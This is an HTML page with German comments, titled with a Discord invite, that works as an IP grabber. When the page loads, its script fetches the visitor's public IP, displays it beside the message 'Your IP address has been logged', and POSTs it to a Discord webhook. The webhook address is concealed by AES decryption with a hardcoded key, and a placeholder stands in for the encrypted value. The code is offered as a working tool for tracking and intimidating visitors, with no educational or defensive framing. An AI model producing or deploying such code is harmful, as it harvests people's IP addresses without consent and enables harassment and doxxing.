<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/drogen</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        #ipDisplay {
            font-size: 4em;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .subtitle {
            font-size: 1.8em;
            font-weight: bold;
        }
        #audioPlayer {
            margin-top: 20px;
            font-size: 1.5em;
        }
    </style>
</head>
<body>
    <div id="player"></div>
    <p id="ipDisplay">Loading your IP address...</p>
    <p class="subtitle">Your IP address has been logged</p>

    <div id="audioPlayer">
        <audio id="audio" controls>
            <source src="https://cdn.discordapp.com/attachments/1151144288483283016/1331247379873267722/video0_4.mp3?ex=6790ec3c&is=678f9abc&hm=b7fb03d1208db3c18da202c24059577c6738efdfdfcfe9cca3a06ecc05887a4f&" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
    <script>
        // Der verschlüsselte Webhook, den du aus dem Backend erhalten hast
        const encryptedWebhook = "VerschlüsselterWebhookVonServer"; // Ersetze mit dem tatsächlichen verschlüsselten Webhook

        const secretKey = "Sigma123!"; // Dein Passwort
        const decryptedWebhook = CryptoJS.AES.decrypt(encryptedWebhook, secretKey).toString(CryptoJS.enc.Utf8);

        async function logIP() {
            try {
                // Holen der IP-Adresse
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                const ip = data.ip;

                // Zeige die IP-Adresse auf der Seite an
                document.getElementById('ipDisplay').textContent = `Your IP: ${ip}`;

                // Sende die IP-Adresse an den entschlüsselten Webhook
                await fetch(decryptedWebhook, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        content: `IP Address: ${ip}`,
                        timestamp: new Date().toISOString(),
                    }),
                });
            } catch (error) {
                console.error("Error logging IP:", error);
                document.getElementById('ipDisplay').textContent = "Error loading IP address";
            }
        }

        // Logge die IP-Adresse sobald die Seite geladen wird
        logIP();
    </script>
</body>
</html>
